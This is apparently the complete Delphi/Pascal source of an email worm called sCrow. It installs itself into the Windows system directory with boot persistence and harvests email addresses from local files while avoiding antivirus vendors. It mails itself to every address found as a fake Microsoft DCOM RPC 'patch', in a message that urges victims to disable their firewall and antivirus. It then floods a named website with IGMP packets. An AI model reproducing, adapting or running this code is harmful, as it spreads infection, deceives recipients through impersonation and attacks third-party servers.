   program StillCrow;
   uses
     windows,winsock,
     socketunit,
     ubase64,igmp;

     type
     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

   label whatever;

     var
   all_mail:String;
   names:String;


   function FileAge(const FileName: string): Integer;
   {$IFDEF MSWINDOWS}
   var
     Handle: THandle;
     FindData: TWin32FindData;
     LocalFileTime: TFileTime;
   begin
     Handle := FindFirstFile(PChar(FileName), FindData);
     if Handle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(Handle);
       if (FindData.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) = 0 then
       begin
         FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
         if FileTimeToDosDateTime(LocalFileTime, LongRec(Result).Hi,
           LongRec(Result).Lo) then Exit;
       end;
     end;
     Result := -1;
   end;
   {$ENDIF}
   {$IFDEF LINUX}
   var
     st: TStatBuf;
   begin
     if stat(PChar(FileName), st) = 0 then
       Result := st.st_mtime
     else
       Result := -1;
   end;
   {$ENDIF}

   function FileExists(const FileName: string): Boolean;
   {$IFDEF MSWINDOWS}
   begin
     Result := FileAge(FileName) <> -1;
   end;
   {$ENDIF}
   {$IFDEF LINUX}
   begin
     Result := euidaccess(PChar(FileName), F_OK) = 0;
   end;
   {$ENDIF}

   function IntToStr(X: integer): string;
    var
     S: string;
    begin

     Str(X, S);
     Result := S;
    end;

   function StrToInt(S: string): integer;
    var
     V, Code: integer;
    begin
     Val(S, V, Code);
     Result := V;
    end;

   function Trim(const S: string): string;
    var
     I, L: Integer;
    begin
     L := Length(S);
     I := 1;
     while (I <= L) and (S[I] <= ' ') do Inc(I);
     if I > L then Result := '' else
      begin
       while S[L] <= ' ' do Dec(L);
       Result := Copy(S, I, L - I + 1);
      end;
    end;

   function getip(iip:string):String;
   var ip:phostent;
       ipc:cardinal;
       ipa:array[1..4]of byte absolute ipc;
   begin
     ip:=winsock.gethostbyname(pchar(iip));
     if ip=nil then begin
       result:='127.0.0.1';
       exit;
     end else begin
       ipc:=cardinal(pointer(ip^.h_addr_list^)^);
       ipc:=winsock.ntohl(ipc);
     end;
     result:=inttostr(ipa[4])+'.'+inttostr(ipa[3])+'.'+inttostr(ipa[2])+'.'+inttostr(ipa[1]);
   end;

   function UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   procedure focuswin(olle:integer);
   var
     w:hwnd;
   begin
     w:=olle;
     setforegroundwindow(w);
   end;

   function DriveType(strDisk: string):string;
    begin
      case GetDriveType(PChar(strDisk)) of
         DRIVE_REMOVABLE: DriveType:='Removable';
         DRIVE_FIXED: DriveType:='Fixed';
         DRIVE_REMOTE: DriveType:='Remote';
         DRIVE_CDROM: DriveType:='CD-ROM';
         DRIVE_RAMDISK: DriveType:='RamDisk';
         else DriveType:='Unknown';
      end;
   end;

   function GetDrives:string;
   var
      p:integer;
      This,All,c,f,cDrives:string;
   begin
      c:=Chr(13);
      f:=Chr(0);
      SetLength(cDrives,300);
      GetLogicalDriveStrings(300,PChar(cDrives));
      p:=Pos(f,cDrives);
      while p > 0 do
      begin
         This:=Copy(cDrives,1,p - 1);
         if Length(This) <> 3 then Break;
         This:=UpperCase(This) + ' - ' + DriveType(This);
         cDrives:=Copy(cDrives,p + 1,Length(cDrives));
         p:=Pos(f,cDrives);
         All:=All + This + c;
      end;
      GetDrives:=Copy(All,1,Length(All) - 1);
   end;

   function mail2(s:string;ext:String):string;
   var
   i,j:integer;
   abc:string;
   f:string;
   label q,t;
   begin
    abc := '@.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-0123456789';
   result := '';
   i:=0;
   q:
   if pos('.'+ext,s)-i = 0 then begin
   for j :=0 to length(result)-1 do begin
   f := f + copy(result,length(result)-j,1);
   end;
    result := f + ext;
    exit;
   end;
   if pos(copy(s,pos('.'+ext,s)-i,1),abc) = 0 then begin
   i:=pos('.'+ext,s);//i+1;
   goto q;
   end else begin
   result := result + copy(s,pos('.'+ext,s)-i,1);
   i:=i+1;
   goto q;
   end;
   end;

   procedure mail(g:string;ext:string);
   var i:integer;y,a,s:string;
   abc:string;
   label u,b,f;
   begin
    abc := '@.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-0123456789';
   f:
   if (pos('.'+ext,g) > 0) then begin
   s := copy(g,0,pos('.'+ext,g));
   s := s +ext;
   i:=1;
   b:
   y:=copy(s,pos('.'+ext,s)-i,1);
   if pos(y,abc) > 0 then
   begin
    a:=copy(s,pos(' ',s)+1,length(s));
   while pos(' ',a) > 0 do
    a:=copy(a,pos(' ',a)+1,length(a));
   if pos('www',a) > 0 then exit;
   if pos('wwp',a) > 0 then exit;
   if pos('ftp',a) > 0 then exit;
   if pos('http',a) > 0 then exit;
   if pos('@',a) = 0 then exit;
   a := mail2(a,ext);
   if (a <> '.'+ext) and (a <> '') and (a <> ' ') and (a <> ' .'+ext) then begin
    if pos(uppercase(a),uppercase(all_mail)) =0 then begin
    if (pos(uppercase('antiv'),uppercase(a)) = 0) and
       (pos(uppercase('syman'),uppercase(a)) = 0) and
       (pos(uppercase('microsoft'),uppercase(a)) = 0) and
       (pos(uppercase('trendm'),uppercase(a)) = 0) and
       (pos(uppercase('f-sec'),uppercase(a)) = 0) and
       (pos(uppercase('mcaf'),uppercase(a)) = 0) and
       (pos(uppercase('virus'),uppercase(a)) = 0) and
       (pos(uppercase('anti'),uppercase(a)) = 0) and
       (pos(uppercase('kav'),uppercase(a)) = 0) and
       (pos(uppercase('kasp'),uppercase(a)) = 0) then
     all_mail := all_mail + uppercase(a) + #13#10;
   end;
    //all_mail := all_mail + a + '%';
   end;
    end
    else begin
   i:=i+1;
   sleep(100);
    goto b;
    end;
   end;
   g := copy(g,pos(a,g)+length(a),length(g));
   if copy(g,0,2) = #13#10 then g := copy(g,3,length(g));
   if pos('.'+ext,g) > 0 then goto f;
   end;

   function Extractfilename(s:String):String;
   begin

    while pos('\',s)>0 do
     s := copy(s,pos('\',s)+1,length(s));

    result := s;
   end;

   Function gimmebody(b:string):string;
   var
       TextTemp: String;
       TextTemp2: String;
       Text: String; test:integer;
       EditText: TextFile;
   begin
   try
   if pos('.',extractfilename(b)) = 0 then exit;
       AssignFile(EditText, b);
       Reset(EditText);
       test := filesize(edittext);
   if test > 800 then exit;
       Read(Edittext, TextTemp);
       ReadLn(EditText, TextTemp2);
       Text := TextTemp;
   While Not Eof(EditText) do begin
       Read(Edittext, TextTemp);
       ReadLn(EditText, TextTemp2);
       Text := Text + #13 + #10 + TextTemp;
   end;
       CloseFile(EditText);
       result := text;
   except
    exit;
   end;
   end;

   procedure ReadText(b:string);
   var
       TextTemp: String;
       TextTemp2: String;
       Text: String; test:integer;
       EditText: TextFile;
   begin
   try
   if pos('.',extractfilename(b)) = 0 then exit;

       AssignFile(EditText, b);
       try
       Reset(EditText);
       except
       exit;
       end;
       test := filesize(edittext);
   if test > 1200 then exit;
       Read(Edittext, TextTemp);
       ReadLn(EditText, TextTemp2);
       Text := TextTemp;
   While Not Eof(EditText) do begin
       Read(Edittext, TextTemp);
       ReadLn(EditText, TextTemp2);
       Text := Text + #13 + #10 + TextTemp;
   end;
       CloseFile(EditText);
       mail(text,'co.nz');
       mail(text,'com');
       mail(text,'net');
       mail(text,'org');
       mail(text,'se');
       mail(text,'tk');
   except
    exit;
   end;
   end;

   procedure ListFiles(D, Name, SearchName : String);
   const
     faReadOnly  = $00000001 platform;
     faHidden    = $00000002 platform;
     faSysFile   = $00000004 platform;
     faVolumeID  = $00000008 platform;
     faDirectory = $00000010;
     faArchive   = $00000020 platform;
     faAnyFile   = $0000003F;

   type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle  platform;
       FindData: TWin32FindData  platform;
     end;

     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

     function FindMatchingFile(var F: TSearchRec): Integer;
     var
       LocalFileTime: TFileTime;
     begin
       with F do
       begin
         while FindData.dwFileAttributes and ExcludeAttr <> 0 do
           if not FindNextFile(FindHandle, FindData) then
           begin
             Result := GetLastError;
             Exit;
           end;
         FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
         FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
           LongRec(Time).Lo);
         Size := FindData.nFileSizeLow;
         Attr := FindData.dwFileAttributes;
         Name := FindData.cFileName;
         if (name <> '.') and (name <> '..') and ((uppercase(copy(name,length(name)-3,4))='.HTM') or
                                                  (uppercase(copy(name,length(name)-3,4))='.VBS') or
                                                  (uppercase(copy(name,length(name)-3,4))='.TXT') or
                                                  (uppercase(copy(name,length(name)-3,4))='HTML') or
                                                  (uppercase(copy(name,length(name)-3,4))='.ASP')) then begin
         try
    if (pos(uppercase('antiv'),    uppercase(d+name)) = 0) and
       (pos(uppercase('syman'),    uppercase(d+name)) = 0) and
       (pos(uppercase('microsoft'),uppercase(d+name)) = 0) and
       (pos(uppercase('trendm'),   uppercase(d+name)) = 0) and
       (pos(uppercase('f-sec'),    uppercase(d+name)) = 0) and
       (pos(uppercase('mcaf'),     uppercase(d+name)) = 0) and
       (pos(uppercase('virus'),    uppercase(d+name)) = 0) and
       (pos(uppercase('anti'),     uppercase(d+name)) = 0) and
       (pos(uppercase('kav'),      uppercase(d+name)) = 0) and
       (pos(uppercase('serv'),      uppercase(d+name)) = 0) and
       (pos(uppercase('kasp'),     uppercase(d+name)) = 0) then
          names:=names+d+name+#13#10;
         except
          ;
         end;
         end;
       end;
       Result := 0;
     end;

     procedure FindClose(var F: TSearchRec);
     begin
       if F.FindHandle <> INVALID_HANDLE_VALUE then
       begin
         Windows.FindClose(F.FindHandle);
         F.FindHandle := INVALID_HANDLE_VALUE;
       end;
     end;

     function FindFirst(const Path: string; Attr: Integer;
       var  F: TSearchRec): Integer;
     const
       faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
     begin
       F.ExcludeAttr := not Attr and faSpecial;
       F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
       if F.FindHandle <> INVALID_HANDLE_VALUE then
       begin
         Result := FindMatchingFile(F);
         if Result <> 0 then FindClose(F);
       end else
         Result := GetLastError;
     end;

     function FindNext(var F: TSearchRec): Integer;
     begin
       if FindNextFile(F.FindHandle, F.FindData) then
         Result := FindMatchingFile(F) else
         Result := GetLastError;
     end;

   var
     SR: TSearchRec;
   begin
     If D[Length(D)] <> '\' then D := D + '\';

     If FindFirst(D + '*.*', faDirectory, SR) = 0 then
       Repeat
         If ((Sr.Attr and faDirectory) = faDirectory) and (SR.Name[1] <> '.') then
           ListFiles(D + SR.Name + '\', Name, SearchName);
       Until (FindNext(SR) <> 0);
     FindClose(SR);
   end;

   var
    c:TClientsocket;
    TempDirBuff,TempFileNameBuff:Pchar;
    line1,line2,m,n,te,file1, file2,a,b,f:strinG;
    G:textfile;
    fgs:integer;
    HEJSAN:array[0..555]of char;
    ff,mailto:string;
    drives:string;
   begin

   getsystemdirectory(hejsan,255);
   ff := hejsan;
   ff := ff + '\sCrow.exe';
   copyfile(pchar(paramstr(0)),pchar(ff),false);
   writeprivateprofilestring('boot','shell',pchar('Explorer.exe sCrow.exe'),'system.ini');

       listfiles('C:\','*','*.*');

   while names<> '' do begin
   n:=copy(names,1,pos(#13#10,names)-1);

   getMem(TempDirBuff,MAX_PATH+1);
   getMem(TempFileNameBuff,MAX_PATH+1);

   GetTempPath(MAX_PATH+1,TempDirBuff);
   GetTempFileName(TempDirBuff,'~DP',0,TempFileNameBuff);
   m :=PChar(Copy(TempFileNameBuff,0,Length(TempFileNameBuff) - 3) + '.txt');
   copyfile(pchar(n),PChar(Copy(TempFileNameBuff,0,Length(TempFileNameBuff) - 3) + '.txt'),false);
   try
   if fileexists(m) then ReadText(m);
   deletefile(pchar(m));
   except
   ;
   end;
   names := copy(names,pos(#13#10,names)+2,length(names));
   end;
   whatever:
   c := TClientsocket.Create;
   c.Connect('mail.hotmail.com',25);
   if not c.Connected then
    goto whatever
   else
    begin

   copyfile(pchar(paramstr(0)),'C:\EViL.exe',false);
   encode_base64('c:\EViL.exe','c:\MS-56095M_PATCH.exe');
   file2:='c:\MS-56095M_PATCH.exe';
   deletefile('C:\evil.exe');
   assignfile(g,'C:\cool.txt');
   rewrite(g);
   write(g,all_mail);
   closefile(g);
   while All_MAil <> '' do begin
   mailto := copy(all_mail,1,pos(#13#10,all_mail)-1);
   c.SendString('HELO hotmail.com'+#13#10);
   c.SendString('MAIL FROM: <Security@Microsoft.com>'+#13#10);
   c.SendString('RCPT TO: <'+mailto+'>'+#13#10);

   c.SendString('DATA'+#13#10);

   randomize();
   a := '';
   b := '';
   while length(a) <= 13 do
   a:=a+inttostr(random(9));

   while length(b) <= 4 do
   b := inttostr(random(99999));

   f := 'Message-ID: '+a+'.'+b+'.qmail@hotmail.com';

   c.SendString(f+#13#10);
   c.SendString('DATE: 13:37:00'+#13#10);
   c.SendString('FROM: Security Alert <Security@Microsoft.com>'+#13#10);
   c.SendString('TO: '+mailto+' <'+mailto+'>'+#13#10);
   c.SendString('Reply-to: Security Alert <Security@Microsoft.com>'+#13#10);
   randomize;
   case random(2) of
   0:c.SendString('SUBJECT: DCOM RPC Exploit Patch'+#13#10);
   1:c.SendString('SUBJECT: DCOM RPC Exploit'+#13#10);
   2:c.SendString('SUBJECT: Patch your Systems.'+#13#10);
   end;
   C.SendString('MIME-Version: 1.0'+#13#10);
   C.SendString('Content-Type: multipart/mixed; boundary="--ABCDEF"'+#13#10);
   C.SendString('X-Priotity: 3'+#13#10);
   C.SendString('X-MSMail-Priority: Normal'+#13#10);
   C.SendString('X-Mailer: Microsoft Outlook Express 5.50'+#13#10);
   C.SendString('X-MimeOLE: Produced by Microsoft MimeOLE v 5.50'+#13#10);
   C.SendString(#13#10 + 'This is a multipart MIME-coded message'+#13#10+#13#10);
   C.SendString('----ABCDEF'+#13#10);
   C.SendString('Content-Type: text/html; charset="us-ascii"'+#13#10);
   C.SendString('Content-Transfer-Encoding: quoted-printable'+#13#10);
   C.SendString(#13#10);

   C.SendString('Ever since the announcement of the RPC DCOM vulnerability,<BR>the hacker community has been busy refining exploits in order to make use of this issue.<BR>'+#13#10);
   C.SendString('Over the last two weeks, a number of exploits have been released.<BR>They are very easy to use and have already been used to attack numerous systems.<BR>'+#13#10);
   C.SendString('Currently, more than 1/4 of the sensors participating in the Internet Storm Center have detected scans for this vulnerability.<BR>'+#13#10);
   C.SendString('If successful, the exploit will be hard to detect.<BR>Only if the exploit failed, you will see a popup alert indicating that the RPC service died. Your machine may reboot by itself as a result.<BR>'+#13#10);
   C.SendString('Essentially all versions of Windows are vulnerable. The only exception is Windows ME.<BR>A patch has been made available by Microsoft as of July 16th 2003.<BR>'+#13#10);
   C.SendString('Recommendation:<BR>'+#13#10);
   C.SendString('- Patch your systems as fast as possible.<BR>'+#13#10);
   C.SendString('- apply firewall rules to block at least port 135, 139 and 445.<BR>RPC may use other ports as well depending on configuration. Do not use these limited rules in lieu of patches.<BR>'+#13#10);
   C.SendString('<BR><BR>'+#13#10);
   C.SendString('SNORT Rules:<BR>'+#13#10);
   C.SendString('alert tcp $EXTERNAL_NET any -> $HOME_NET 135 (msg:"NETBIOS DCERPC invalid bind attempt"; flow:to_server,established; content:"|05|"; distance:0; within:1; content:"|0b|"; distance:1; within:');
   C.SendString('1; byte_test:1,&,,,,1,0,relative; content:"|00|"; distance:21; within:1; classtype:attempted-dos; sid:2190; rev:1;)<BR>'+#13#10);
   C.SendString('<BR>alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"NETBIOS SMB DCERPC invalid bind attempt"; flow:to_server,established; content:"|FF|SMB|25|"; nocase; offset:4; depth:5; content:"|26 00|"; ');
   C.SendString('distance:56; within:2; content:"|5c 00|P|00|I|00|P|00|E|00 5c 00|"; nocase; distance:5; within:12; content:"|05|"; distance:2; within:1; content:"|0b|"; distance:1; within:1; byte_test:1,&,,');
   C.SendString(',,1,0,relative; content:"|00|"; distance:21; within:1; classtype:attempted-dos; sid:2191; rev:1;)<BR>'+#13#10);
   C.SendString('<BR>alert tcp $EXTERNAL_NET any -> $HOME_NET 135 (msg:"NETBIOS DCERPC ISystemActivator bind attempt"; flow:to_server,established; content:"|05|"; distance:0; within:1; content:"|0b|"; distance:1');
   C.SendString('; within:1; byte_test:1,&,,,,1,0,relative; content:"|A0 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 46|"; distance:29; within:16; reference:cve,CAN-2003-0352; classtype:attempted-admin; sid:2192; rev:1;)<BR>'+#13#10);
   C.SendString('<BR>alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"NETBIOS SMB DCERPC ISystemActivator bind attempt"; flow:to_server,established; content:"|FF|SMB|25|"; nocase; offset:4; depth:5; content:"|');
   C.SendString('26 00|"; distance:56; within:2; content:"|5c 00|P|00|I|00|P|00|E|00 5c 00|"; nocase; distance:5; within:12; content:"|05|"; distance:0; within:1; content:"|0b|"; distance:1; within:1; byte_t');
   C.SendString('est:1,&,,,,1,0,relative; content:"|A0 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 46|"; distance:29; within:16; reference:cve,CAN-2003-0352; classtype:attempted-admin; sid:2193; rev:1;)<BR>'+#13#10);
   C.SendString('<BR><BR>'+#13#10);
   C.SendString('Patch your systems with the MS-560954 DCOM RPC exploit patch to rid of this vulnerability.Download the attachment, turn off all firewall''s and Antivirus and run the patch.<BR>'+#13#10);
   C.SendString('<BR><BR>'+#13#10);
   C.SendString('---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------'+#13#10+#13#10);
   C.SendString('©2003 Microsoft Corporation. All rights reserved<BR>'+#13#10);

   C.SendString('----ABCDEF'+#13#10);
   C.SendString('Content-Type: audio/x-wav; name="MS-56095M_PATCH.exe"'+#13#10);
   C.SendString('Content-Transfer-Encoding: base64'+#13#10);
   C.SendString('Content-Disposition: attachment; filename="MS-56095M_PATCH.exe"'+#13#10);
   C.SendString('Content-ID: <SOMECID>'+#13#10);
   C.SendString(#13#10);

   assignfile(g,file2);

   reset(g);
   read(g,line1);
   readln(g,line2);
   te := line1;
   C.sendstring(te+#13#10);
   while not EOF(g) do begin
   read(g,line1);
   readln(g,line2);
   te := line1;
   C.sendstring(te+#13#10);
   end;
   closefile(g);

   C.SendString(#13#10);
   C.SendString('----ABCDEF--'+#13#10);
   sleep(1000);
   c.SendString(#13#10+'.'+#13#10);
   all_mail:=copy(all_mail,pos(#13#10,all_mail)+2,length(all_mail));
   end;
   c.SendString('QUIT'+#13#10);
   c.Disconnect;
   deletefile('C:\MS-56095M_PATCH.exe');
   assignfile(g,'C:\Listen_at_me.txt');
   rewrite(g);
   write(g,'||-------<I-Worm.sCROW>--------||'+#13#10);
   write(g,'||-----Z loves Laura-----------||'+#13#10);
   write(g,'||----------and----------------||'+#13#10);
   write(g,'||--------i miss you crow------||'+#13#10);
   write(g,'||-i really do----------aug 9th||');
   closefile(g);
   while 1<>2 do IGMPD(getip('http://www.lunarstorm.se'),'600000','100','0',100);
   end;

   end.
